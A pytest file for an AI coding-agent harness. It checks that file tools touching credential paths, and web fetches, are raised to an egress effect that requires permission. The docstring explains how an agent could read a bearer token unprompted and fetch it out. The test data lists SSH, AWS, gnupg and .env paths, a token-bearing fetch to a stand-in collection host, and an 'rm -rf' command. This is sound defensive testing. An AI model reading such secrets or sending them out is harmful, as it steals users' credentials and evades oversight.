"""The Claude lane gets the same exfiltration floor as the opencode lane.

The Claude harness is a documented choice, and on that lane every
non-Bash file tool was mapped straight to ``("fs", Effect.READ)``. A READ resolves
to ``decided_by="read"`` before any mode is consulted, so ``Read`` of
``~/.alkera/auth.yml`` — the user's 90-day gateway bearer token — was auto-allowed
with no prompt, no judge and no audit record, in ``read_only`` and ``plan`` too,
while the identical ``cat ~/.alkera/auth.yml`` through the shell gate prompted.
``WebFetch`` was mapped READ as well, so the outbound leg of the same two-step leak
was free.

These cases pin the floor on every path-bearing tool, the sandbox carve-out that
keeps plan mode working, the fail-closed arm for a directory walk with no location,
and the EGRESS classification of the fetch.
"""

from __future__ import annotations

from pathlib import Path
from typing import Any

import pytest
from alkera_cli.contracts.tool_types import Effect
from alkera_cli.harness.adapters.claude_agent import _descriptor_for_tool
from alkera_cli.plugins.plugin_base.permissions import CREDENTIAL_PATH_GATE_ENV

_WORKSPACE = Path("/work/project")
_SANDBOX = Path("/work/project/.alkera/chats/c1/sandbox")


@pytest.fixture(autouse=True)
def _credential_path_gate_on(monkeypatch: pytest.MonkeyPatch) -> None:
    """The gate is OFF by default (``credential_path_gate_enabled``): the scan
    refused the plan file plan mode asks for, and it has not been tested against
    the paths a real session names. These cases run with it switched on so the
    mechanism stays pinned for the day it is turned back on deliberately; the
    default-off contract lives in ``test_credential_path_gate_switch.py``."""
    monkeypatch.setenv(CREDENTIAL_PATH_GATE_ENV, "1")


def _descriptor(tool: str, tool_input: dict[str, Any], **kwargs: Any) -> Any:
    return _descriptor_for_tool(
        tool,
        tool_input,
        sandbox_dir=kwargs.pop("sandbox_dir", _SANDBOX),
        workspace_root=kwargs.pop("workspace_root", _WORKSPACE),
    )


# --- a credential path escalates, whichever tool names it --------------------

_SECRET_READS = [
    pytest.param("Read", {"file_path": "~/.alkera/auth.yml"}, id="read-the-gateway-token"),
    pytest.param("Read", {"file_path": "/home/dev/.ssh/id_ed25519"}, id="read-an-ssh-key"),
    pytest.param("Read", {"file_path": "/home/dev/.aws/credentials"}, id="read-aws-credentials"),
    pytest.param("Read", {"file_path": "/work/project/.env"}, id="read-a-project-env"),
    pytest.param("Read", {"file_path": "/etc/ssl/server.pem"}, id="read-a-private-key-file"),
    # grep returns the matched LINES, so pointing it at a secret directory is a
    # full read primitive — and the location lives in `path`, not `file_path`.
    pytest.param("Grep", {"pattern": "AKIA", "path": "/home/dev/.aws"}, id="grep-the-aws-dir"),
    pytest.param("Glob", {"pattern": "*", "path": "/home/dev/.ssh"}, id="glob-the-ssh-dir"),
    pytest.param("LS", {"path": "/home/dev/.gnupg"}, id="ls-the-gnupg-dir"),
    pytest.param(
        "NotebookEdit",
        {"notebook_path": "/home/dev/.alkera/notes.ipynb"},
        id="edit-under-the-alkera-home",
    ),
]


@pytest.mark.parametrize(("tool", "tool_input"), _SECRET_READS)
def test_a_tool_that_reaches_a_credential_path_is_raised_to_egress(
    tool: str, tool_input: dict[str, Any]
) -> None:
    descriptor = _descriptor(tool, tool_input)
    assert descriptor is not None
    assert descriptor.effect == Effect.EGRESS
    assert descriptor.reasons, "the escalation must say which path caused it"


_ORDINARY_READS = [
    pytest.param("Read", {"file_path": "/work/project/src/main.py"}, id="read-a-source-file"),
    pytest.param("Grep", {"pattern": "TODO", "path": "/work/project/src"}, id="grep-the-source"),
    pytest.param("Glob", {"pattern": "**/*.py", "path": "/work/project"}, id="glob-the-project"),
    pytest.param("LS", {"path": "/work/project/docs"}, id="ls-a-docs-dir"),
]


@pytest.mark.parametrize(("tool", "tool_input"), _ORDINARY_READS)
def test_an_ordinary_read_stays_a_read(tool: str, tool_input: dict[str, Any]) -> None:
    """The asymmetric half — the floor must not turn every file read into a prompt."""
    descriptor = _descriptor(tool, tool_input)
    assert descriptor is not None
    assert descriptor.effect == Effect.READ
    assert descriptor.reasons == []


def test_the_chats_own_scratch_dir_is_exempt() -> None:
    """The sandbox sits under ``.alkera/`` — which the marker list covers — but holds
    only the model's own plan and scratch files, and plan mode reads them back."""
    descriptor = _descriptor("Read", {"file_path": str(_SANDBOX / "plan.md")})
    assert descriptor is not None
    assert descriptor.effect == Effect.READ


def test_a_relative_path_is_resolved_against_the_project_before_scanning() -> None:
    """Claude Code reports a path either absolute or project-relative. The relative
    form is joined to the project root before the sandbox carve-out is applied, so a
    project ``.env`` is escalated rather than mistaken for scratch."""
    descriptor = _descriptor("Read", {"file_path": ".env"})
    assert descriptor is not None
    assert descriptor.effect == Effect.EGRESS


def test_a_directory_walk_with_no_location_scans_the_project_root() -> None:
    """Grep/Glob/LS fall back to the project root when no path is given, so that is
    what gets scanned — an ordinary project root is still a read."""
    descriptor = _descriptor("Grep", {"pattern": "x"})
    assert descriptor is not None
    assert descriptor.effect == Effect.READ


def test_a_directory_walk_fails_closed_when_the_root_is_unknown() -> None:
    """With no location in the input and no root to fall back on we cannot say what
    is being read, so the ask is escalated rather than trusted."""
    descriptor = _descriptor("Grep", {"pattern": "x"}, workspace_root=None)
    assert descriptor is not None
    assert descriptor.effect == Effect.EGRESS


def test_a_write_to_a_credential_path_is_escalated_not_downgraded() -> None:
    """The floor only ever tightens: a WRITE that names a secret path becomes EGRESS."""
    descriptor = _descriptor("Write", {"file_path": "/home/dev/.ssh/authorized_keys"})
    assert descriptor is not None
    assert descriptor.effect == Effect.EGRESS


def test_an_ordinary_write_keeps_its_write_effect() -> None:
    descriptor = _descriptor("Write", {"file_path": "/work/project/src/new.py"})
    assert descriptor is not None
    assert descriptor.effect == Effect.WRITE


# --- the outbound leg -------------------------------------------------------


def test_web_fetch_is_egress_and_web_search_stays_a_read() -> None:
    """A fetch encodes whatever the model holds into the URL it requests, so it is a
    channel out of the machine. A search query goes to a fixed provider instead."""
    fetch = _descriptor("WebFetch", {"url": "https://collect.example/?d=token"})
    search = _descriptor("WebSearch", {"query": "how to read a parquet file"})
    assert fetch is not None and fetch.effect == Effect.EGRESS
    assert search is not None and search.effect == Effect.READ


def test_bash_still_routes_through_the_shell_classifier() -> None:
    """The bash branch is untouched: it classifies by the command, not by the map."""
    descriptor = _descriptor("Bash", {"command": "rm -rf /work/project/build"})
    assert descriptor is not None
    assert descriptor.effect == Effect.DESTROY
